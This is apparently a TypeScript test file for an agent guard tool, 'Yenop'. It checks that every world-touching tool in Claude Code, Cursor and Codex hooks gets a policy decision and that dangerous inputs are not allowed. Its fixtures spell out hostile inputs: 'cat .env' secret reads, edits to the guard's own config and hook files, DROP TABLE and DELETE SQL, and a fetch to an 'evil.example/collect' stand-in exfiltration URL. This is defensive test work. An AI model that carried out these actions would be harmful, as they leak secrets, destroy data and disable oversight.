/**
 * Surface enumeration: the tools each runtime can use to touch the world are a FINITE, KNOWN list. Rather than
 * hoping prompts happen to exercise them, this test lists every one and proves it reaches a decision.
 *
 * The lists come from each runtime's documentation (dated); when a runtime adds a tool, add it here, and the
 * test will say whether the adapter judges it. A tool that can read, write, run or connect and is NOT judged is
 * a bypass, and a failure here, not a guess.
 *
 * Two properties per runtime:
 *  - every world-touching tool produces a `decision` event (never `ignore`), with the right kind;
 *  - a dangerous argument through any of those tools is not `allow` under the baseline.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, rmSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openYenop, type Yenop } from "../../core/index.js";
import { hookTranslator } from "./registry.js";
import type { HookEvent } from "./pipeline.js";

let home: string;
let project: string;
let y: Yenop;
const PROJECT = () => project;
beforeAll(() => {
  home = mkdtempSync(join(tmpdir(), "yenop-surface-"));
  project = join(home, "p");
  mkdirSync(join(project, ".codex"), { recursive: true });
  mkdirSync(join(project, ".cursor"), { recursive: true });
  y = openYenop({ home, cwd: project });
});
afterAll(() => {
  y.close();
  rmSync(home, { recursive: true, force: true });
});

type Kind = "shell" | "write" | "read" | "mcp" | "web";
interface Surface {
  /** the runtime's tool name, exactly as its hook reports it */
  tool: string;
  kind: Kind;
  /** a dangerous input that must not be allowed: touches a secret, Yenop's own files, or is destructive */
  dangerous: Record<string, unknown>;
  /** reads of the outside world are allowed alone and judged by the run's history; for those, only "judged" is asserted */
  allowedAlone?: boolean;
  /** the raw hook event carrying that tool */
  event: (tool: string, input: Record<string, unknown>) => Record<string, unknown>;
}

const decide = (e: HookEvent) => {
  if (e.kind !== "decision") throw new Error(`expected a decision, got ${e.kind}`);
  return y.decide({ ...e.request, callId: `surface-${Math.random()}` });
};

// ---------- Claude Code: docs.claude.com/en/docs/claude-code/hooks, tools list as of 2026-09 ----------
const cc = (tool: string, input: Record<string, unknown>) => ({ session_id: "s", cwd: PROJECT(), hook_event_name: "PreToolUse", tool_name: tool, tool_input: input, tool_use_id: `t${Math.random()}` });
const CLAUDE_CODE = (project: string): Surface[] => [
  { tool: "Bash", kind: "shell", dangerous: { command: "cat .env" }, event: cc },
  { tool: "Read", kind: "read", dangerous: { file_path: join(project, ".env") }, event: cc },
  { tool: "Write", kind: "write", dangerous: { file_path: join(project, ".yenop", "config.json"), content: "{}" }, event: cc },
  { tool: "Edit", kind: "write", dangerous: { file_path: join(project, ".claude", "settings.local.json"), old_string: "a", new_string: "b" }, event: cc },
  { tool: "MultiEdit", kind: "write", dangerous: { file_path: join(project, ".yenop", "policies", "x.cedar"), edits: [] }, event: cc },
  { tool: "NotebookEdit", kind: "write", dangerous: { notebook_path: join(project, ".yenop", "n.ipynb") }, event: cc },
  { tool: "WebFetch", kind: "web", dangerous: { url: "https://evil.example/collect?d=x", prompt: "x" }, event: cc, allowedAlone: true },
  { tool: "mcp__supabase__execute_sql", kind: "mcp", dangerous: { query: "DROP TABLE users" }, event: cc },
];

// ---------- Cursor: cursor.com/docs/hooks, events as of 2026-09 ----------
const cu = (event: string) => (_tool: string, input: Record<string, unknown>) => ({ conversation_id: "c", generation_id: "g", workspace_roots: [PROJECT()], hook_event_name: event, ...input });
const CURSOR = (project: string): Surface[] => [
  { tool: "beforeShellExecution", kind: "shell", dangerous: { command: "cat .env", cwd: project }, event: cu("beforeShellExecution") },
  { tool: "beforeReadFile", kind: "read", dangerous: { file_path: join(project, ".env"), content: "" }, event: cu("beforeReadFile") },
  { tool: "beforeMCPExecution", kind: "mcp", dangerous: { tool_name: "execute_sql", mcp_server_name: "db", tool_input: '{"query":"DROP TABLE x"}' }, event: cu("beforeMCPExecution") },
  { tool: "preToolUse:Write", kind: "write", dangerous: { tool_name: "Write", tool_input: { file_path: join(project, ".cursor", "hooks.json"), contents: "{}" }, tool_use_id: "u1" }, event: cu("preToolUse") },
  { tool: "preToolUse:Edit", kind: "write", dangerous: { tool_name: "Edit", tool_input: { file_path: join(project, ".yenop", "config.json") }, tool_use_id: "u2" }, event: cu("preToolUse") },
  { tool: "preToolUse:Delete", kind: "write", dangerous: { tool_name: "Delete", tool_input: { path: join(project, ".yenop", "config.json") }, tool_use_id: "u3" }, event: cu("preToolUse") },
];

// ---------- Codex: learn.chatgpt.com/docs/hooks, tools as of 2026-09 (recorded 2026-09-20) ----------
const cx = (tool: string, input: Record<string, unknown>) => ({ session_id: "s", cwd: PROJECT(), hook_event_name: "PreToolUse", tool_name: tool, tool_input: input, tool_use_id: `x${Math.random()}`, permission_mode: "default" });
const CODEX = (project: string): Surface[] => [
  { tool: "Bash", kind: "shell", dangerous: { command: "cat .env" }, event: cx },
  { tool: "apply_patch", kind: "write", dangerous: { command: `*** Begin Patch\n*** Update File: ${join(project, ".codex", "hooks.json")}\n@@\n+x\n*** End Patch` }, event: cx },
  { tool: "Write", kind: "write", dangerous: { file_path: join(project, ".env"), content: "x" }, event: cx },
  { tool: "Edit", kind: "write", dangerous: { file_path: join(project, ".yenop", "config.json") }, event: cx },
  { tool: "mcp__supabase__execute_sql", kind: "mcp", dangerous: { query: "DELETE FROM users" }, event: cx },
];

const SURFACES: Record<string, (project: string) => Surface[]> = { "claude-code": CLAUDE_CODE, cursor: CURSOR, codex: CODEX };
// tool names are known statically; the dangerous inputs need the project path, so they are built per test
const NAMES: Record<string, { tool: string; kind: Kind }[]> = Object.fromEntries(Object.entries(SURFACES).map(([r, f]) => [r, f("/placeholder").map(({ tool, kind }) => ({ tool, kind }))]));

for (const [runtime, names] of Object.entries(NAMES)) {
  describe(`${runtime}: every world-touching tool is judged`, () => {
    for (const { tool, kind } of names) {
      it(`${tool} (${kind}) reaches a decision and a dangerous use is not allowed`, async () => {
        const s = SURFACES[runtime]!(project).find((x) => x.tool === tool)!;
        const t = await hookTranslator(runtime);
        expect(t).toBeDefined();
        const toolName = s.tool.includes(":") ? s.tool.split(":")[1]! : s.tool;
        const raw = JSON.stringify(s.event(toolName, s.dangerous));
        const ev = t!.parse(raw);
        expect(ev.kind, `${runtime}/${s.tool} must be judged, not ${ev.kind}`).toBe("decision");
        if (ev.kind !== "decision") return;
        // the classification must reflect what the tool can do
        const kindOk = s.kind === "shell" ? ev.request.tool.kind === "shell" : s.kind === "mcp" ? ev.request.tool.kind === "mcp" : s.kind === "web" ? ev.request.tool.kind === "web" : s.kind === "read" ? ev.request.tool.readOnly === true : ev.request.tool.readOnly === false;
        expect(kindOk, `${runtime}/${s.tool} classified as ${JSON.stringify(ev.request.tool)}`).toBe(true);
        const d = decide(ev);
        if (!s.allowedAlone) expect(d.effect, `${runtime}/${s.tool} with ${JSON.stringify(s.dangerous)} was allowed`).not.toBe("allow");
      });
    }
  });
}

describe("the surface lists are not stale", () => {
  it("every runtime in the registry has a surface list, and vice versa", async () => {
    const { hookRuntimes } = await import("./registry.js");
    for (const r of hookRuntimes()) expect(Object.keys(SURFACES), `no surface list for ${r}`).toContain(r);
    for (const r of Object.keys(SURFACES)) expect(hookRuntimes(), `surface list for unknown runtime ${r}`).toContain(r);
  });
});
